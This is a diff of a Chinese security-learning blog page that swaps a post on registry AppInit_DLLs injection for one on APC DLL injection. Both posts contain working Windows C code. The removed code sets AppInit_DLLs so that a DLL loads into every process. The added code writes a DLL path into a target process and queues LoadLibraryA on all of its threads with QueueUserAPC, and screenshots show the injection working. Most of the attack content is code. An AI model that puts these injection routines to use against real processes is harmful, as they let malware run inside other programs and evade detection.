@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="https://e1ectr0nlc.github.io/2024/04/28/注册表注入/"/>
+  <link rel="canonical" href="https://e1ectr0nlc.github.io/2023/07/20/apc注入/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,19 +33,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>e1ectr0nlc's Blog</title>
+  <title>APC注入 - e1ectr0nlc's Blog</title>
   <meta name="keywords" content="null">
-  <meta desc name="description" content="学习记录 - e1ectr0nlc - e1ectr0nlc's Blog">
+  <meta desc name="description" content="APC注入利用了当前线程从中断中恢复时会检查APC队列中是否有函数未执行进行函数调用来注入。 - e1ectr0nlc - e1ectr0nlc's Blog">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="e1ectr0nlc&#39;s Blog">
-<meta property="og:url" content="https://e1ectr0nlc.github.io/2024/04/28/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="APC注入">
+<meta property="og:url" content="https://e1ectr0nlc.github.io/2023/07/20/APC%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="e1ectr0nlc&#39;s Blog">
-<meta property="og:description" content="说实话，注册表是杀软严密监视的地方，我觉得现在对注册表进行的操作十有八九都会被查出来（但技术还是要学的）。 概念主要依赖于两个表项，AppInit_Dlls和LoadAppInit_DLLs。AppInit_Dlls写入dll完整路径，LoadAppInit_DLLs写为1，重启后，指定DLL会注入到所有运行进程。User32.dll在被加载到进程时，会读取AppInit_Dlls表项。若有值">
+<meta property="og:description" content="APC注入利用了当前线程从中断中恢复时会检查APC队列中是否有函数未执行进行函数调用来注入。">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2024-04-28T08:30:39.615Z">
-<meta property="article:modified_time" content="2024-05-12T12:13:09.813Z">
+<meta property="article:published_time" content="2023-07-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-05-12T13:15:08.956Z">
 <meta property="article:author" content="e1ectr0nlc">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -1628,7 +1628,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1715517925366),
+    lastupdate: new Date(1715520249779),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2354,7 +2354,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="https://e1ectr0nlc.github.io/2024/04/28/注册表注入/">
+  <link itemprop="mainEntityOfPage" href="https://e1ectr0nlc.github.io/2023/07/20/APC注入/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="e1ectr0nlc's Blog">
   </span>
@@ -2374,27 +2374,91 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
     
-      <span hidden itemprop="name headline">
+      <h1 class="title" itemprop="name headline">
+        APC注入
+      </h1>
+      <div class='new-meta-box'>
         
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://p.sda1.dev/17/b34ee4fae71a87c5156c3e133bc354a4/下载.jpg" class="lazyload" data-srcset="https://p.sda1.dev/17/b34ee4fae71a87c5156c3e133bc354a4/下载.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">e1ectr0nlc</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/Dll%E6%B3%A8%E5%85%A5/">Dll注入</a>
+    
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/Dll%E6%B3%A8%E5%85%A5/" itemprop="url"><span itemprop="name">Dll注入</span></a>
       </span>
+    
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2023-07-20T00:00:00+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2023年7月20日</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
+      </div>
     
   </div>
 
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <hr>
-<hr>
-<p>说实话，注册表是杀软严密监视的地方，我觉得现在对注册表进行的操作十有八九都会被查出来（但技术还是要学的）。</p>
-<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>主要依赖于两个表项，<code>AppInit_Dlls</code>和<code>LoadAppInit_DLLs</code>。<code>AppInit_Dlls</code>写入dll完整路径，<code>LoadAppInit_DLLs</code>写为1，重启后，指定DLL会注入到所有运行进程。<code>User32.dll</code>在被加载到进程时，会读取<code>AppInit_Dlls</code>表项。若有值，会调用<code>LoadLibrary</code>来载入这个字符串中指定的每个DLL。所以注册表注入只对加载<code>user32.dll</code>的进程有效。</p>
-<h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>说实话这种方法的思路也没什么好说的，甚至不需要编写程序就可以实现。</p>
-<ul>
-<li>打开注册表键值如下：<code>HKEY_LOCAL_MACHINE\SoftWare\MicroSoft\Windows NT\CurrentVersion\Windows\</code>；</li>
-<li>在上面的注册表项中操作 <code>AppInit_DLLs</code> 键值，在该键值中添加自己的DLL的全路径加dll名，多个DLL以逗号或者空格分开；</li>
-<li>在该注册表项中添加键值<code>LoadAppInit_DLLs</code>，类型为<code> DWORD</code>，并将其值置为 1 。</li>
-</ul>
-<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HKEY hKey;</span><br><span class="line">	<span class="type">char</span> csAppInitValue[] = <span class="string">&quot;F:\\code_py&amp;C\\vs2017\\injecte\\Dll1\\x64\\Release\\Dll1.dll&quot;</span>;</span><br><span class="line">	DWORD dwLoadAppInitValue = <span class="number">1</span>;</span><br><span class="line">	<span class="type">char</span> csSubKey[] = <span class="string">&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\&quot;</span>;</span><br><span class="line">    <span class="comment">//打开注册表</span></span><br><span class="line">	LSTATUS lsRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, <span class="string">L&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot;</span>, <span class="number">0</span>, KEY_READ, &amp;hKey);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (lsRet != ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Open Key Failed....\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> csBuf[<span class="number">100</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	DWORD dwSize = <span class="number">100</span>;</span><br><span class="line">	DWORD dwType = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">	RegQueryValueExA(hKey, <span class="string">&quot;AppInit_DLLs&quot;</span>, <span class="number">0</span>, &amp;dwType, (LPBYTE)csBuf, &amp;dwSize);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> nSize = <span class="built_in">strlen</span>(csAppInitValue);</span><br><span class="line">    <span class="comment">//添加Dll路径</span></span><br><span class="line">	lsRet = RegSetValueExA(hKey, <span class="string">&quot;AppInit_DLLs&quot;</span>, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE *)csAppInitValue, nSize + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (lsRet != ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Set Key Failed1....\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//将LoadAppInit_DLLs设为1</span></span><br><span class="line">	lsRet = RegSetValueExA(hKey, <span class="string">&quot;LoadAppInit_DLLs&quot;</span>, <span class="number">0</span>, REG_DWORD, (<span class="type">const</span> BYTE *)&amp;dwLoadAppInitValue, <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (lsRet != ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Set Key Failed2....\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	RegCloseKey(hKey);</span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    <p>APC注入利用了当前线程从中断中恢复时会检查APC队列中是否有函数未执行进行函数调用来注入。</p>
+<span id="more"></span>
 
+
+
+<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>首先来了解下什么是APC技术。APC全称为异步过程调用，它允许一个线程请求另一个线程在适当的时候异步执行一个特定的函数。通俗来讲，当一个线程调用一个阻塞的系统调用时，例如<code>SleepEx()</code>,<code>WaitForSingleObjectEx()</code>等，内核态返回的时候会检查是否需要执行 apc 。在这种情况下，可以使用APC来在系统调用完成时执行一些额外的代码，而不需要等待系统调用返回。</p>
+<h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>适用程序：</p>
+<p>1.多线程程序；</p>
+<p>2.会调用<code>SleepEx()</code>、<code>WaitForSingleObjectEx()</code>、<code>WaitForMultipleObjectsEx()</code>、<code>SignalObjectAndWait()</code>等函数。</p>
+<p>流程：</p>
+<ul>
+<li><p>当EXE里某个线程执行到<code>SleepEx()</code>或者<code>WaitForSingleObjectEx()</code>时，系统就会产生一个软中断。</p>
+</li>
+<li><p>当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。</p>
+</li>
+<li><p>利用<code>QueueUserAPC()</code>这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。</p>
+</li>
+</ul>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>通过快照获取属于目标进程的所有线程，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取对应进程Id的所有线程Id</span></span><br><span class="line">BOOL <span class="title function_">GetAllThreadIdByProcessId</span><span class="params">(DWORD dwPid, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//线程ID数组中当前的线程ID数量</span></span><br><span class="line">	DWORD dwThreadIdListLength = <span class="number">0</span>;	</span><br><span class="line">    <span class="comment">//线程ID数组的最大容量</span></span><br><span class="line">	DWORD dwThreadIdListMaxCount = <span class="number">2000</span>;</span><br><span class="line">    <span class="comment">//存储线程ID的动态分配数组，通过调用VirtualAlloc分配内存</span></span><br><span class="line">	LPDWORD pThreadIdList = <span class="literal">NULL</span>;		</span><br><span class="line">	pThreadIdList = (LPDWORD)VirtualAlloc(<span class="literal">NULL</span>, dwThreadIdListMaxCount * <span class="keyword">sizeof</span>(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (pThreadIdList == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] Create Thread Id Space Error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">	THREADENTRY32 te32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	RtlZeroMemory(&amp;te32, <span class="keyword">sizeof</span>(te32));</span><br><span class="line">	te32.dwSize = <span class="keyword">sizeof</span>(te32);</span><br><span class="line">    <span class="comment">//创建系统中所有线程的快照</span></span><br><span class="line">	HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);	</span><br><span class="line">	<span class="keyword">if</span> (hThreadSnapshot == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] Create Thread Snap Error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//遍历线程快照，获取每个线程的信息。</span></span><br><span class="line">	BOOL bRet = Thread32First(hThreadSnapshot, &amp;te32);		</span><br><span class="line">	<span class="keyword">while</span> (bRet)</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="comment">//通过比较线程所属进程ID(th32OwnerProcessID)与指定进程ID(dwPid)判断是否与指定进程匹配</span></span><br><span class="line">		<span class="keyword">if</span> (te32.th32OwnerProcessID == dwPid)		</span><br><span class="line">													</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (dwThreadIdListLength &gt;= dwThreadIdListMaxCount)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">            <span class="comment">//如果匹配，则将线程ID te32.th32ThreadID 添加到线程ID数组中							</span></span><br><span class="line">			pThreadIdList[dwThreadIdListLength++] = te32.th32ThreadID;</span><br><span class="line">		&#125;</span><br><span class="line">		bRet = Thread32Next(hThreadSnapshot, &amp;te32);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//将线程ID数组的长度 dwThreadIdListLength 和指针 pThreadIdList </span></span><br><span class="line">    <span class="comment">//分别赋值给传入的参数 pThreadIdListLength 和 ppThreadIdList，以便在函数外部访问线程ID数组。</span></span><br><span class="line">	*pThreadIdListLength = dwThreadIdListLength;			</span><br><span class="line">	*ppThreadIdList = pThreadIdList;						</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//char szDllPath[] = &quot;F:\\code_py&amp;C\\vs2017\\injecte\\Dll1\\x64\\Release\\Dll1.dll&quot;;</span></span><br><span class="line">	<span class="type">char</span> szDllPath[] = <span class="string">&quot;F:\\code_py&amp;C\\vs2017\\injecte\\Dll1\\Debug\\Dll1&quot;</span>;</span><br><span class="line">	<span class="comment">//进程pid</span></span><br><span class="line">    DWORD dwPid = <span class="number">28496</span> ;</span><br><span class="line">	BOOL bRet;</span><br><span class="line">    <span class="comment">//所有线程id</span></span><br><span class="line">	LPDWORD pThreadIdList = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//线程id个数</span></span><br><span class="line">	DWORD dwThreadIdListLength = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//获取当前进程的所有线程</span></span><br><span class="line">	bRet = GetAllThreadIdByProcessId(dwPid, &amp;pThreadIdList, &amp;dwThreadIdListLength);</span><br><span class="line">	<span class="keyword">if</span> (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] Get All Thread Id Error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 打开进程</span></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">	<span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] Open Process Error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD dwDllPathLen = <span class="built_in">strlen</span>(szDllPath) + <span class="number">1</span>;</span><br><span class="line">	<span class="comment">// 申请目标进程空间，用于存储DLL路径</span></span><br><span class="line">	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (lpBaseAddress == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] VirtualAllocEx Error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	SIZE_T dwWriten = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 把DLL路径字符串写入目标进程</span></span><br><span class="line">	WriteProcessMemory(hProcess, lpBaseAddress, szDllPath, dwDllPathLen, &amp;dwWriten);</span><br><span class="line">	<span class="keyword">if</span> (dwWriten != dwDllPathLen)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] Write Process Memory Error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//获取LoadLibraryA的加载地址</span></span><br><span class="line">	LPVOID pLoadLibraryFunc = GetProcAddress(GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pLoadLibraryFunc == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*] Get Func Address Error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 倒序插入线程APC，可避免出现在插入时进程崩溃的现象</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = dwThreadIdListLength - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">	&#123;</span><br><span class="line">        <span class="comment">//线程句柄</span></span><br><span class="line">		HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);</span><br><span class="line">		<span class="keyword">if</span> (hThread)</span><br><span class="line">		&#123;</span><br><span class="line">			QueueUserAPC((PAPCFUNC)pLoadLibraryFunc, hThread, (ULONG_PTR)lpBaseAddress);</span><br><span class="line">			CloseHandle(hThread);</span><br><span class="line">			hThread = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; Success\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hProcess)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		hProcess = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (pThreadIdList)</span><br><span class="line">	&#123;</span><br><span class="line">		VirtualFree(pThreadIdList, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">		pThreadIdList = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	ExitProcess(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行目标注入程序</p>
+<p><img src="https://s2.loli.net/2024/04/28/jbodaXV1vYJcteE.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/28/jbodaXV1vYJcteE.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240428155334215"></p>
+<p>运行Dll注入程序</p>
+<p><img src="D:/typora/picture/image-20240428155439734.png" class="lazyload" data-srcset="D:/typora/picture/image-20240428155439734.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240428155439734"></p>
+<p>目标进程出现测试Dll</p>
+<p><img src="https://s2.loli.net/2024/04/28/iPeCK2JHUyjxG5v.png" class="lazyload" data-srcset="https://s2.loli.net/2024/04/28/iPeCK2JHUyjxG5v.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20240428155439735"></p>
 
   </div>
   
@@ -2419,7 +2483,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-05-12T20:13:09+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-05-12T21:15:08+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：2024年5月12日</p>
@@ -2441,7 +2505,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://e1ectr0nlc.github.io/2024/04/28/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5/&title= - e1ectr0nlc's Blog&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://e1ectr0nlc.github.io/2023/07/20/APC%E6%B3%A8%E5%85%A5/&title=APC注入 - e1ectr0nlc's Blog&summary=APC注入利用了当前线程从中断中恢复时会检查APC队列中是否有函数未执行进行函数调用来注入。"
           
           >
           
@@ -2453,7 +2517,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://e1ectr0nlc.github.io/2024/04/28/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5/&title= - e1ectr0nlc's Blog&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://e1ectr0nlc.github.io/2023/07/20/APC%E6%B3%A8%E5%85%A5/&title=APC注入 - e1ectr0nlc's Blog&summary=APC注入利用了当前线程从中断中恢复时会检查APC队列中是否有函数未执行进行函数调用来注入。"
           
           >
           
@@ -2465,7 +2529,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
